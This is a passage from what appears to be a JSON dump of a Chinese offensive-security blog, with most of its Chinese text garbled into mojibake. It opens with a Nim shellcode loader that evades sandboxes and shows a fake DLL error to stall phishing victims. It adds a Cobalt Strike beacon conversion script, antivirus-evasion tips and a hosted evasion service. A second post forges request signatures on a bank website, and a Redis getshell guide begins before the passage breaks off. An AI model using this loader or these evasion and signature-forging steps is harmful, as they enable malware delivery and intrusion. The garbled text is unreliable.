(LPCWSTR)(L&quot;æ— æ³•æ‰“å¼€æ–‡æ¡£ï¼Œå› ä¸ºè®¡ç®—æœºä¸­ä¸¢å¤± MSVCP140.dllã€‚ å°è¯•é‡æ–°å®‰è£…è¯¥ç¨‹åºä»¥è§£å†³æ­¤é—®é¢˜ã€‚&quot;), &quot;Error&quot;, MB_OK) #éƒ¨åˆ†é’“é±¼æƒ…å†µå¼€å¯æ­¤åŠŸèƒ½ï¼Œè®©ä¸­æ‹›è€…è§£å†³ç”µè„‘ç„å­¦é—®é¢˜ä»è€Œå»¶è¿Ÿé’“é±¼é‚®ä»¶å‘ç°æ—¶é—´ var huasidsiuohiuodsaih1 = huasidsiuohiuodsaih() #cpu var ihojhhasioadsoiihodas1 = ihojhhasioadsoiihodas() #ram var saolkpomsiejskraqjgir1 = rdFileTime(getPartitionInfo(r&quot;C:\\&quot;)[1]) #disk if not (huasidsiuohiuodsaih1 == 4 and ihojhhasioadsoiihodas1 == 6143 and saolkpomsiejskraqjgir1 == 136829726720): #å¾®æ­¥win10æ²™ç®± if not (huasidsiuohiuodsaih1 == 4 and ihojhhasioadsoiihodas1 == 6143 and saolkpomsiejskraqjgir1 == 137331994624): #å¾®æ­¥win7æ²™ç®± if not (huasidsiuohiuodsaih1 == 4 and ihojhhasioadsoiihodas1 == 8190 and saolkpomsiejskraqjgir1 == 322015588352): #qaxçš„win7æ²™ç®± if huasidsiuohiuodsaih1 &gt; 2 and ihojhhasioadsoiihodas1 &gt; 2046: #é€šç”¨æ²™ç®± const sc_length: int = 1000 #è¾“å…¥shellcode var shellcode: seq[byte] = @[byte 0x4D,0x5A,0x41,0x52,0x55,0x48] #Replace with your own shellcode var shellcodePtr = (cast[ptr array[sc_length, byte]](addr shellcode[0])) innerMain(shellcodePtr, len(shellcode)) shellcodeç”ŸæˆåŠæ³• ç¬¬ä¸€ç§ ä½¿ç”¨CSç”Ÿæˆrawæ ¼å¼çš„ï¼Œcsæœ‰ä¸¤ä¸ªä½ç½®å¯ä»¥ç”ŸæˆrawåŒ…ï¼Œæ³¨æ„ä½ç½®ï¼Œæ„æ€å¤§æ¦‚æ˜¯shellcodeåˆ†ä¸ºæ— çŠ¶æ€å’Œæœ‰çŠ¶æ€ï¼Œå…·ä½“é‚£ä¸ªæ˜¯é‚£ä¸ªè®°ä¸æ¸…äº†ï¼ŒåŒºåˆ«æ˜¯ä¸€ä¸ªç›´æ¥ä¸Šçº¿ï¼Œä¸€ä¸ªè¿˜è¦å†å‘CSæœåŠ¡ç«¯è¯·æ±‚ä¸€ä¸ªstageæ–‡ä»¶ï¼Œè¿™ä¸ªæ˜¯ç›´æ¥ä¸Šçº¿çš„ç”Ÿæˆæ–¹å¼ï¼Œç”Ÿæˆçš„rawéœ€è¦è¿›è¡ŒäºŒæ¬¡å¤„ç†è½¬å˜ä¸º0x00æ ¼å¼çš„ï¼Œå†™å¥½çš„pythonä»£ç å¥‰ä¸Š #!/usr/bin python3 # -*- coding: utf-8 -*- #auther:https://github.com/sv3nbeast import binascii,re def analysis(bin_path: str, out_txt_path: str,out_file_path_0x: str): with open(bin_path, 'rb') as f: # è¯»å–å…¨éƒ¨è¡Œ all_data = f.readlines() with open(out_txt_path, 'a+') as new_f: for i in all_data: # äºŒè¿›åˆ¶ï¼ˆbytesï¼‰ç±»å‹è½¬æ¢æˆåå…­è¿›åˆ¶ç±»å‹ hex_str = binascii.b2a_hex(i).decode('unicode_escape') # ä»¥stræ ¼å¼é€è¡Œå†™å…¥åˆ°æ–‡æœ¬ new_f.write(str(hex_str).swapcase()) print(&quot;hexè½¬æ¢å®Œæˆ&quot;) with open(out_txt_path,'r') as hex: with open(out_file_path_0x,'a+') as payload: all_data = hex.readlines() d = '' for i in all_data: b = re.findall(r'.{2}',i) c = ',0x'.join(b) d = d + c f = &quot;0x&quot; + d payload.write(f) print(&quot;payloadè½¬æ¢å®Œæˆ&quot;) if __name__ == '__main__': input_file_path = &quot;./beacon.bin&quot; out_file_path = &quot;./hex.txt&quot; out_file_path_0x = &quot;./0x00.txt&quot; analysis(input_file_path, out_file_path,out_file_path_0x) ç¬¬äºŒç§ ç›´æ¥è·å¾—0x00æ ¼å¼çš„shellcodeï¼Œè¿™ä¸ªç”Ÿæˆç®€å•ï¼Œä¸è¿‡ä¼šå¤šä¸ªè¯·æ±‚csæœåŠ¡ç«¯çš„urlç‰¹å¾ macçš„ç¼–è¯‘å‘½ä»¤ nim c -d:mingw -d:release --opt:speed --app:gui --cpu:amd64 sven.nim --optçš„speedæ„æ€æ˜¯é€Ÿåº¦ä¼˜åŒ– --optçš„sizeæ„æ€æ˜¯æ–‡ä»¶å¤§å°ä¼˜åŒ– --appçš„guiæ„æ€æ˜¯æ‰§è¡Œexeçš„æ—¶å€™ä¸å‡ºç°é»‘æ¡† --appçš„consoleæ„æ€æ˜¯æ‰§è¡Œexeçš„æ—¶å€™å‡ºç°é»‘æ¡†ï¼Œæˆ‘ç”¨æ¥è¾“å‡ºä¿¡æ¯è°ƒè¯•ä»£ç ï¼Œä»¥åæŸ¥æ€guiä¸¥æ ¼åå¯ä»¥æ”¹ç”¨consoleåœ¨ç”¨ä»£ç å…³é—­é»‘æ¡†ï¼Œä»£ç å·²å®ç° winçš„ç¼–è¯‘å‘½ä»¤ nim c --opt:size -d:release --app:gui sven.nim å‘½ä»¤çš„æ„æ€å’Œmacä¸€æ · é’“é±¼ å…¶ä¸­çš„MessageBoxè¿™è¡Œä»£ç å’Œé’“é±¼æœ‰å…³ç³»ï¼Œä¹Ÿå¯ä»¥è‡ªè¡Œæ ¹æ®å®é™…æƒ…å†µæ”¹ï¼Œå¼¹ä¸ªæ¡†ï¼Œå¼•å¯¼ä¸­æ‹›çš„äººè§£å†³ç”µè„‘çš„ç„å­¦é—®é¢˜ï¼Œå»¶è¿Ÿé’“é±¼é‚®ä»¶å‘ç°æ—¶é—´ ç”Ÿæˆæ–‡ä»¶å¤§å° æ ¹æ®shellcodeçš„åŒºåˆ«ï¼Œæœ€ç»ˆç¼–è¯‘çš„æ–‡ä»¶å¤§å°å¦‚ä¸‹ 800-900kb 300-500kb 0x03 ä¸ºå•¥èƒ½å…æ€ ä¸»è¦æ˜¯ç”¨äº†NIMè¯­è¨€æœ¬èº«çš„å°ä¼—ï¼Œä»–è‡ªå¸¦å¤§éƒ¨åˆ†çš„å…æ€æ•ˆæœï¼Œè¿˜èƒ½é…åˆmacçš„äº¤å‰ç¼–è¯‘ åŒæ—¶å¦‚æœé€‰æ‹©ç”Ÿæˆshellcodeæ–¹æ³•æ˜¯ç¬¬ä¸€ç§(å½“ç„¶ä¸è®ºå“ªç§ç›®å‰éƒ½æ˜¯å¯ä»¥çš„)ï¼Œé‚£ä¹ˆcsç”Ÿæˆçš„æ˜¯stagelessçš„shellcodeï¼Œè¿™ç§çš„shellcodeä¸ä¼šå†å»å‘æœåŠ¡å™¨å‘èµ·è·å–stageçš„è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯è¯´å‡å°‘äº†é‚£ä¸ªè¯·æ±‚csçš„checksum8ç‰¹å¾urlï¼Œurlå¤§æ¦‚é•¿è¿™æ · http:test.safe.com/Hjla 0x04 ç»§ç»­å¢åŠ å…æ€æ•ˆæœ åˆ©ç”¨SigThiefå¢åŠ æ•°å­—ç­¾åï¼ŒåŒæ ·å¯ä»¥å¢åŠ å­˜æ´»ä¸€æ®µæ—¶é—´ å¯¹shellcodeåŠ å¯†ï¼Œé˜²æ­¢ç¡¬ç¼–ç åœ¨NIMï¼Œç›®å‰ä»£ç å·²å®ç°ï¼Œæ˜¯è‡ªå·±ä¹Ÿåœ¨ç”¨çš„ä¸€ä¸ªç‰ˆæœ¬ï¼Œä¸è¿‡è¿™ç§åˆ¶ä½œæ–¹å¼æš‚æ—¶è¿˜ä¸åˆ°å¿…é¡»ç”¨çš„åœ°æ­¥ï¼Œå…ˆç­‰ä¸åŠ å¯†çš„è¢«æ€äº†å†ç”¨ æ²™ç®±ä¼šå¯¹EXEçš„é™æ€åˆ†æä¸­æ­£åˆ™åŒ¹é…URLï¼Œæ‰€ä»¥å¯ä»¥é™æ€åŠ å…¥ä¸€äº›æ­£è§„åŸŸåçš„urlé“¾æ¥é…åˆåŸŸå‰ç½®çš„æ­£è§„åŸŸåæ··æ·†è§†å¬ï¼Œæˆ‘çš„åŸŸå‰ç½®æ ¹åŸŸåæ˜¯baidu.comï¼Œæ‰€ä»¥æˆ‘åŠ å…¥çš„æ˜¯baiduçš„é“¾æ¥ï¼Œå½“ç„¶åªæ˜¯ä¸ºäº†å¹²æ‰°é‚£äº›åªæ˜¯æ ¹æ®æ²™ç®±è¿è¡Œç»“æœè¿›è¡Œäººå·¥åˆ¤æ–­çš„æ‘¸é±¼é˜²å®ˆï¼Œä¸€ç‚¹æ¶è¶£å‘³ æ¯•ç«Ÿä¸æ˜¯ä¸“ä¸šçš„ï¼Œå—é™ä»£ç æ°´å¹³å“ˆ 0x05 è¿˜æœ‰ä¸ªåœ¨çº¿å…æ€ http://124.223.65.106:9000/ ä½¿ç”¨csçš„payloadç”Ÿæˆå™¨ç”Ÿæˆrawæ ¼å¼çš„payload.binæ–‡ä»¶ä¸Šä¼ å³å¯ è¿™ä¸ªä¹Ÿæ˜¯ç”¨äº†NIMå†™çš„ï¼Œç½‘é¡µæ˜¯pythonå¯çš„djangoï¼ŒNIMä»£ç å’Œä¸Šé¢çš„ä¸ä¸€æ ·ï¼Œä¸€äº›ç®€å•é¡¹ç›®å°±ç”¨è¿™ä¸ªï¼Œå¤æ‚çš„æˆ‘è‡ªå·±åšå¯¹åº”çš„å®šåˆ¶ç‰ˆï¼Œå¹¶ä¸”æ²¡æœ‰macçš„äº¤å‰ç¼–è¯‘æ•ˆæœè¦å¼±ä¸€äº›ï¼Œä»£ç é‡Œæœ‰é€šç”¨æ²™ç®±çš„è¿‡æ»¤ä»£ç ï¼ŒshellcodeåŠ è§£å¯†ä»£ç ï¼Œæœ€åç»™exeæ–‡ä»¶åŠ äº†360çš„ç­¾å(ç­¾åæ˜¯å¦æ·»åŠ å¯è‡ªè¡Œé€‰æ‹©) ","link":"https://www.svenbeast.com/post/yRPqlWutW/"},{"title":"åŠ è§£å¯†ä¼ è¾“é€šæ€æ–¹æ¡ˆä¹‹JSRPC","content":"0x01 åºè¨€ å‰ç«¯çš„åŠ è§£å¯†ä¸€ç›´æ˜¯å¾ˆå¤šå¸ˆå‚…ç»å¸¸é‡åˆ°è¿‡çš„é—®é¢˜ï¼Œä¸€ä¸ªåŠ è§£å¯†ä¼ è¾“ï¼Œç­¾åï¼Œé˜²ç¯¡æ”¹ï¼Œå¯¼è‡´å¾ˆå¤šæ—¶å€™æ²¡æœ‰åŠæ³•å¯¹å‚æ•°çš„å€¼è¿›è¡Œæ›´æ”¹ï¼Œä»£ç ä¸­å­˜åœ¨çš„webæ¼æ´ä¹Ÿæ²¡åŠæ³•æµ‹è¯•å‡ºæ¥ï¼Œå½“ç„¶è¿™ä¹Ÿæ˜¯ä¸€ç§ç¬¦åˆæ‰€æœ‰åœºæ™¯çš„é˜²å¾¡åŠæ³•ï¼Œå¢åŠ æ”»å‡»æˆæœ¬ï¼Œæ˜¯ä¸€ä¸ªå¾ˆæ£’çš„é˜²å¾¡æ–¹æ¡ˆã€‚ æœ‰çš„å¸ˆå‚…æµ‹è¯•é‡åˆ°æ—¶æ— éä¼šæœ‰å‡ ç§æƒ³æ³•: è¿™ä¸ªè¿˜éœ€è¦ç ”ç©¶jsï¼Œemmï¼Œä¸å¤ªä¼šï¼Œä»¥åå†å­¦ä¹ (ç„¶åé¸½é¸½é¸½ è¿™ä¸ªç ”ç©¶ä¸€æ®µæ—¶é—´åº”è¯¥ä¹Ÿèƒ½å°è¯•ä¸€ä¸‹ï¼Œä»¥å‰è²Œä¼¼çœ‹åˆ°è¿‡è¿™ç§æ–‡ç« ï¼Œç…§ç€æ–‡ç« ç ”ç©¶ä¸€å¤©åº”è¯¥ä¹Ÿå¯ä»¥è¯•è¯•ï¼Œä½†æ˜¯å¥½æµªè´¹æ—¶é—´ï¼Œæœ€åä¹Ÿä¸ä¸€å®šå¼„å¥½ï¼Œå¼„å¥½ä¹Ÿä¸ä¸€å®šæœ‰æ´ï¼Œä¸‹æ¬¡æœ‰æœºä¼šåœ¨æµ‹å§(ç„¶åé¸½é¸½é¸½ å¥½éº»çƒ¦ï¼Œè¿˜è¦æŠŠç”¨åˆ°çš„jså¼„ä¸‹æ¥æœ¬åœ°è¿è¡Œï¼Œæœ‰çš„æ˜¯æ‰“åŒ…çš„jsè¿˜ä¸èƒ½ç”¨ï¼Œæœ‰çš„è¿˜è¦ä¿®æ”¹é‡Œé¢çš„jsä»£ç ï¼Œä¸ºä»€ä¹ˆè¦è¿™ä¹ˆéº»çƒ¦ï¼Œè¿™æ¬¡æµ‹è¯•å·®ä¸å¤šå°±å¾—äº†ï¼Œæ‘¸é±¼æ‰æ˜¯çœŸç†(ç„¶åæ‘¸æ‘¸æ‘¸ ps: æœ‰çš„å¸ˆå‚…ç¡®å®æ—¶é—´ç´§ä»»åŠ¡é‡ï¼Œå¯ä»¥ç†è§£ï¼Œæ¯•ç«Ÿå¦‚æœæ˜¯åŠåŠå­å»å®‰æ’ä»»åŠ¡å¤§éƒ¨åˆ†éƒ½ä¼šè§‰å¾—æ—¶é—´ç»™çš„å¾ˆå……è¶³~ 0x02 JSRPCç†è§£ å¯¹äºæˆ‘ä»¬æ¥è¯´ï¼Œjsrpcå°±æ˜¯å°†æœ¬åœ°å’Œæµè§ˆå™¨ï¼Œçœ‹åšæ˜¯æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ï¼ŒäºŒè€…ä¹‹é—´é€šè¿‡ WebSocket åè®®è¿›è¡Œ RPC é€šä¿¡ï¼Œåœ¨æµè§ˆå™¨ä¸­å°†åŠ å¯†å‡½æ•°æš´éœ²å‡ºæ¥ï¼Œåœ¨æœ¬åœ°ç›´æ¥è°ƒç”¨æµè§ˆå™¨ä¸­å¯¹åº”çš„åŠ å¯†å‡½æ•°ï¼Œä»è€Œå¾—åˆ°åŠ å¯†ç»“æœï¼Œä¸å¿…å»åœ¨æ„å‡½æ•°å…·ä½“çš„æ‰§è¡Œé€»è¾‘ï¼Œä¹Ÿçœå»äº†æ‰£ä»£ç ã€è¡¥ç¯å¢ƒç­‰æ“ä½œï¼Œå¯ä»¥çœå»å¤§é‡çš„é€†å‘è°ƒè¯•æ—¶é—´ã€‚ 0x03 ä¸€æ¬¡å®Œæ•´çš„æŸé“¶è¡Œç½‘ç«™åˆ©ç”¨jsrpcè§£å†³jsåŠ å¯†ä¼ è¾“çš„ç¬”è®° 1.ä¸‹è½½jsrpcï¼ŒåŒæ ·ç”¨jsrpcæŠ€æœ¯çš„é¡¹ç›®è¿˜æœ‰sekiroï¼Œæˆ‘çš„ç›®æ ‡ä¸ºhttpsç«™ç‚¹ï¼Œæ³¨é‡Šæ‰main.goçš„197è¡Œå’Œ198è¡Œï¼Œè§£é™¤194è¡Œçš„æ³¨é‡Šï¼Œè¿›è¡Œç¼–è¯‘ç”Ÿæˆè¿è¡Œ 2.æ‰“å¼€ç½‘ç«™f12çš„æ§åˆ¶å°ï¼Œæ‰“å¼€å·¥å…·é‡Œé¢çš„jsenv.jsï¼Œå†…å®¹å…¨éƒ¨å¤åˆ¶ï¼Œå¤åˆ¶åˆ°æ§åˆ¶å°ç›´æ¥è¿è¡Œï¼Œè¿™æ ·è¿™ä¸ªä»£ç å°±æ³¨å…¥äº† 3.æ§åˆ¶å°ç»§ç»­æ·»åŠ jsä»£ç ï¼Œä½œç”¨æ˜¯ä½¿ç”¨jsçš„websocketåè®®è¿æ¥ä¸Šé¢å·¥å…·è¿è¡Œå¼€æ”¾çš„12080ç«¯å£ï¼Œgroupå’Œnameçš„å€¼éšæ„ï¼Œåé¢ä½¿ç”¨é“¾æ¥çš„æ—¶å€™å€¼ä¸€æ ·å°±è¡Œï¼Œå¯ä»¥å½“åšä¸€å¥è¯æœ¨é©¬çš„å¯†ç é€»è¾‘ç†è§£ 4.å‘ç°ç½‘ç«™ä¼šæ¯æ¬¡ç”Ÿæˆsignæ”¾å…¥headerä¸­ï¼Œä¿®æ”¹å‚æ•°åŠå€¼ä¼šå¯¼è‡´è®¿é—®ç½‘ç«™å¤±è´¥ï¼Œæ‰€ä»¥æ¯æ¬¡æ”¹å€¼å°±éœ€è¦ç”Ÿæˆå¯¹åº”çš„ç­¾å 5.æ ¹æ®signå…³é”®å­—å»jsä»£ç ä¸­å¯»æ‰¾åŠ å¯†ç‚¹ 6.ç»™è¿™ä¸ªå‡½æ•°æœ«å°¾æ·»åŠ æ–­ç‚¹ï¼Œç½‘ç«™æ­£å¸¸è¿è¡Œï¼Œå‘ç°ç›®æ ‡ç½‘ç«™å­˜åœ¨jsåè°ƒè¯•ï¼Œå¦‚æœç½‘ç«™æ²¡æœ‰åè°ƒè¯•çš„è¿™æ­¥å¿½ç•¥å³å¯ï¼Œè¿™é‡Œåˆ©ç”¨burpçš„åŒ¹é…å¹¶æ›¿æ¢çš„åŠŸèƒ½æ›¿æ¢ç½‘ç«™2å¤„åè°ƒè¯•çš„jsä»£ç ï¼Œå…·ä½“åŸç†ä¸å¤šè¯´äº†ï¼Œè¿™ä¸ªä¸æ˜¯ä»Šå¤©ä¸»è§’ 7.ç½‘ç«™æ­£å¸¸è°ƒè¯•ï¼Œè¿è¡Œè‡³æ–­ç‚¹å¤„ï¼Œæ­¤æ—¶å›åˆ°æ§åˆ¶å°ï¼Œå¯¹jsä¸­çš„å‡½æ•°å’Œå€¼è¿›è¡Œè¾“å‡ºï¼ŒéªŒè¯æ˜¯å¦æ»¡è¶³åŠ å¯†è¦æ±‚,console.log(r),u(&quot;aaaa&quot;)ï¼Œå‘ç°rå˜é‡ç¡®å®æ˜¯signçš„å€¼ï¼Œuå‡½æ•°ç¡®å®æ˜¯åŠ å¯†å‡½æ•°ï¼Œæ ¹æ®ä¼ å…¥çš„å€¼ç”ŸæˆåŠ å¯†ç»“æœå­˜å…¥r 8.æ–­ç‚¹ï¼Œyydsï¼Œæ­¤æ—¶æ§åˆ¶å°èƒ½æ­£å¸¸è°ƒç”¨åŠ å¯†å‡½æ•°äº†ï¼Œéœ€è¦æŠŠuå‡½æ•°æ”¹ä¸ºå…¨å±€å‡½æ•°ï¼Œæ„æ€å°±æ˜¯ä»¥åä¸éœ€è¦æ–­ç‚¹ä¹Ÿèƒ½å¤Ÿè°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ„æ€ï¼Œä½¿ç”¨ä»£ç window.test = uï¼Œæ§åˆ¶å°è¾“å…¥å³å¯ï¼Œå…³é—­è°ƒè¯•åŠŸèƒ½ï¼Œå‘ç°æ§åˆ¶å°ç›´æ¥è°ƒç”¨testå‡½æ•°ï¼Œå°±ç›¸ç­‰äºè°ƒç”¨uå‡½æ•°äº† 9.ç»§ç»­æ§åˆ¶å°æ³¨å…¥jsä»£ç ï¼Œhacker2å°±æ˜¯actionå‚æ•°çš„å€¼ï¼Œçœ‹äº†è¿œç¨‹è°ƒç”¨çš„urlå°±æ˜ç™½äº†ï¼Œhttp://127.0.0.1:12080/go?group=zzz&amp;name=hlg&amp;action=hacker2&amp;param=xxxxxxxxxx demo.regAction(&quot;hacker2&quot;, function (resolve,param) { console.log(param); var base666 = test(param); //testå°±æ˜¯ä¸Šé¢é‚£ä¸ªåŠ å¯†å‡½æ•° resolve(base666); }) æ¯”å¦‚æƒ³å¯¹å­—ç¬¦ä¸²svenåŠ å¯†ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥è¿œç¨‹è°ƒç”¨æµè§ˆå™¨çš„åŠ å¯†å‡½æ•°äº†ï¼ŒåŠ å¯†api +1ï¼Œä¹‹åéšæ„ä½ æ€ä¹ˆä½¿ç”¨éƒ½å¯ä»¥äº†ï¼Œå„æ˜¾ç¥é€š,ä»»æ„å‘æŒ¥å³å¯ï¼Œæˆ–è®¸ç­‰autoDecodeè¿™ä¸ªbpæ’ä»¶ä»¥ååŠŸèƒ½æ›´å…¨é¢äº†ï¼Œæ²¡å‡†ç›´æ¥èƒ½å¯¹æ¥ä¸Š 10.æˆ‘è¿™é‡Œæ˜¯ç”¨mitmdumpå¼„äº†ä¸ªpyä¸­è½¬ï¼Œburpçš„åŒ…è½¬åˆ°è¿™ä¸ªä»£ç†ä¸Šï¼Œå¯¹è¯·æ±‚è¿›è¡Œä¸€ä¸ªåŠ å·¥åè½¬å‘ã€‚è‡ªåŠ¨è·å¾—æˆ‘éœ€è¦çš„å‚æ•°å’Œå€¼å½“åšå­—ç¬¦ä¸²ï¼Œç„¶åè¯·æ±‚è°ƒç”¨æ§åˆ¶å°çš„apiè·å¾—åŠ å¯†åçš„signå€¼ï¼Œæ›¿æ¢åˆ°burpå‘æ¥çš„è¯·æ±‚åŒ…é‡Œï¼Œå†å°†è¯·æ±‚å‘å‡ºå»ï¼Œè¿™æ ·ä»€ä¹ˆå·¥å…·åªè¦é€šè¿‡burpå‘é€è¯·æ±‚ï¼Œå°±éƒ½ä¼šæ˜¯ç­¾åæ­£ç¡®çš„è¯·æ±‚äº† #encrypt.js import requests import json from urllib.parse import unquote from urllib.parse import quote def request(flow): print('request url is %s' % flow.request.url) /* éšæ„å¯¹flowçš„å€¼è¿›è¡Œä¿®æ”¹å³å¯ï¼ŒåŒæ—¶è¦æ³¨æ„urlç¼–ç é—®é¢˜ sign = json.loads(requests.get(&quot;http://127.0.0.1:12080/go?group=zzz&amp;name=hlg&amp;action=hacker2&amp;param={}&quot;.format(&quot;æƒ³è¦åŠ å¯†çš„å­—ç¬¦ä¸²&quot;)).text) flow.request.headers['Sign'] = sign['data'] */ 0x04 æ€»ç»“ 1.æ— éœ€å¤ªé«˜çš„jsä»£ç æ°´å¹³ 2.æ­¥éª¤å¤§å¤šéƒ½æ˜¯æœºæ¢°å¯é‡å¤æ­¥éª¤ 3.æ— è®ºjsä»€ä¹ˆæ ¼å¼ï¼Œéƒ½ä¸å½±å“æ“ä½œ 4.å½“ç„¶ä¹Ÿä¼šæœ‰ä¸€äº›çŸ¥è¯†ä¼šå½±å“ä½¿ç”¨ç†è§£ï¼Œæ¯”å¦‚æµè§ˆå™¨è°ƒè¯•æ°´å¹³ï¼Œé˜…è¯»ç†è§£æ°´å¹³ï¼Œburpä½¿ç”¨æ°´å¹³ï¼Œæ¼æ´é€»è¾‘ç†è§£æ°´å¹³ 5.å†…å·é©±åŠ¨å™¨ ","link":"https://www.svenbeast.com/post/kn2fEdp4Q/"},{"title":"åˆ©ç”¨Redis Getshellçš„æ‰€æœ‰åˆ©ç”¨æ–¹æ³•","content":"0x00 Redis ç®€ä»‹ Redisï¼ˆRemote Dictionary Server )ï¼Œå³è¿œç¨‹å­—å…¸æœåŠ¡ï¼Œæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€Key-Valueæ•°æ®åº“ï¼Œå¹¶æä¾›å¤šç§è¯­è¨€çš„APIã€‚ç”±äºå…¶è‡ªèº«ç‰¹ç‚¹ï¼Œå¯ä»¥å¹¿æ³›åº”ç”¨åœ¨æ•°æ®é›†ç¾¤ï¼Œåˆ†å¸ƒå¼é˜Ÿåˆ—ï¼Œä¿¡æ¯ä¸­é—´ä»¶ç­‰ç½‘ç»œæ¶æ„ä¸­ï¼Œåœ¨å†…ç½‘æ¸—é€çš„çªç ´ä¸­ï¼Œå¸¸å¸¸æ‰®æ¼”getshellçš„è§’è‰²ï¼Œredisä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº†master-slave(ä¸»ä»)åŒæ­¥ã€‚ æ€»ç»“ â€” ä¸€ä¸ªæ•°æ®åº“ï¼Œé»˜è®¤ç«¯å£æ˜¯6379ï¼Œæ‹¥æœ‰å¾ˆå¤šæ¼æ´ã€‚ 0x01 ç¯å¢ƒ &amp; å·¥å…·å‡†å¤‡ Linux ç¼–è¯‘å®‰è£…ï¼Œå®‰è£…åä»…èƒ½åœ¨å®‰è£…ç›®å½•ä¸‹è¿è¡Œ wget https://download.redis.io/releases/redis-6.2.5.tar.gz tar xzf redis-6.2.5.tar.gz cd redis-6.2.5 make # å¯åŠ¨ redis æœåŠ¡ï¼Œå¯ä»¥æŒ‡å®šé…ç½®æ–‡ä»¶å¯åŠ¨(è‹¥ä¸æŒ‡å®šåˆ™ä»¥é»˜è®¤çš„é…ç½®æ–‡ä»¶å¯åŠ¨) cd src ./redis-server # å¯åŠ¨ redis å®¢æˆ·ç«¯ ./redis-cli Windows å®‰è£… https://github.com/MicrosoftArchive/redis/releases ä¸‹è½½ Redis-x64-3.0.504.zip å¹¶è§£å‹ redis-server.exe redis.windows.conf Dockerå®‰è£… docker pull vertigo/redis4 docker run -p 6379:6379 vertigo/redis4 å¯èƒ½ç”¨åˆ°çš„åˆ©ç”¨å·¥å…· redis-cli MDUT RedisWriteFile dll-hijacking Gopherus 0x02 Redis è¯­æ³• Redis é”®å‘½ä»¤çš„åŸºæœ¬è¯­æ³•ä¸ºï¼š COMMAND KEY_NAME ä½¿ç”¨ * å¯ä»¥è·å–æ‰€æœ‰é…ç½®é¡¹(GET ã€ KEYS) ä½¿ç”¨ SET å’Œ GET å‘½ä»¤ï¼Œå¯ä»¥å®ŒæˆåŸºæœ¬çš„èµ‹å€¼å’Œå–å€¼æ“ä½œï¼› Redis ä¸åŒºåˆ†å‘½ä»¤çš„å¤§å°å†™ï¼Œset å’Œ SET æ˜¯åŒä¸€ä¸ªæ„æ€ï¼› å¦‚æœé”®çš„å€¼ä¸­æœ‰ç©ºæ ¼ï¼Œéœ€è¦ä½¿ç”¨åŒå¼•å·æ‹¬èµ·æ¥ï¼› SET key &quot;Hello World&quot; # è®¾ç½®é”® key çš„å€¼ä¸ºå­—ç¬¦ä¸² Hello World GET key # è·å–é”® key çš„å€¼ï¼Œå¦‚æœ key ä¸å­˜åœ¨ï¼Œè¿”å› nil ã€‚å¦‚æœkey å‚¨å­˜çš„å€¼ä¸æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œè¿”å›ä¸€ä¸ªé”™è¯¯ DEL key # åˆ é™¤é”® key KEYS * # è·å– redis ä¸­æ‰€æœ‰çš„ key,Keys å‘½ä»¤ç”¨äºæŸ¥æ‰¾æ‰€æœ‰ç¬¦åˆç»™å®šæ¨¡å¼ pattern çš„ key SAVE # ç”¨äºåˆ›å»ºå½“å‰æ•°æ®åº“çš„å¤‡ä»½,åœ¨ redis å®‰è£…ç›®å½•ä¸­åˆ›å»ºdump.rdbæ–‡ä»¶ CONFIG GET requirepass # ç”¨äºè·å– redis æœåŠ¡çš„é…ç½®å‚æ•°ï¼Œé€šè¿‡ CONFIG å‘½ä»¤æŸ¥çœ‹æˆ–è®¾ç½®é…ç½®é¡¹ CONFIG REWRITE requirepass &quot;123456&quot; # å¯¹ redis.conf é…ç½®æ–‡ä»¶è¿›è¡Œæ”¹å†™ï¼Œé‡å¯åæ‰ä¼šè¢«ä¿®æ”¹ CONFIG SET requirepass &quot;123456&quot; # åŠ¨æ€åœ°è°ƒæ•´ Redis æœåŠ¡å™¨çš„é…ç½®(configuration)è€Œæ— é¡»é‡å¯ Flushall # ç”¨äºæ¸…ç©ºæ•´ä¸ª Redis æœåŠ¡å™¨çš„æ•°æ®(åˆ é™¤æ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰ key) SELECT index # Redis Select å‘½ä»¤ç”¨äºåˆ‡æ¢åˆ°æŒ‡å®šçš„æ•°æ®åº“ï¼Œæ•°æ®åº“ç´¢å¼•å· index ç”¨æ•°å­—å€¼æŒ‡å®šï¼Œä»¥ 0 ä½œä¸ºèµ·å§‹ç´¢å¼•å€¼ã€‚ 0x03 Redis é…ç½®æ–‡ä»¶ Redis çš„é…ç½®æ–‡ä»¶ä½äº Redis å®‰è£…ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åä¸º redis.conf(Windows åä¸º redis.windows.conf)ã€‚å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡æŒ‡å®šé…ç½®æ–‡ä»¶æ¥è¿›è¡Œå¯åŠ¨ã€‚åˆ—ä¸¾ä¸€äº›é‡è¦çš„é…ç½®é¡¹è¿›è¡Œè¯´æ˜ã€‚ é…ç½®é¡¹ è¯´æ˜ port 6379 æŒ‡å®š Redis ç›‘å¬ç«¯å£ï¼Œé»˜è®¤ç«¯å£ä¸º 6379 bind 127.0.0.1 ç»‘å®šçš„ä¸»æœºåœ°å€ï¼Œæ ¼å¼ä¸ºbindåé¢æ¥IPåœ°å€ï¼Œå¯ä»¥åŒæ—¶ç»‘å®šåœ¨å¤šä¸ªIPåœ°å€ä¸Šï¼ŒIPåœ°å€ä¹‹é—´ç”¨ç©ºæ ¼åˆ†ç¦»ï¼Œå¦‚ bind 192.168.1.100 10.0.0.1ï¼Œè¡¨ç¤ºåŒæ—¶ç»‘å®šåœ¨192.168.1.100å’Œ10.0.0.1ä¸¤ä¸ªIPåœ°å€ä¸Šã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šbindå‚æ•°ï¼Œåˆ™ç»‘å®šåœ¨æœ¬æœºçš„æ‰€æœ‰IPåœ°å€ä¸Šã€‚ save æ 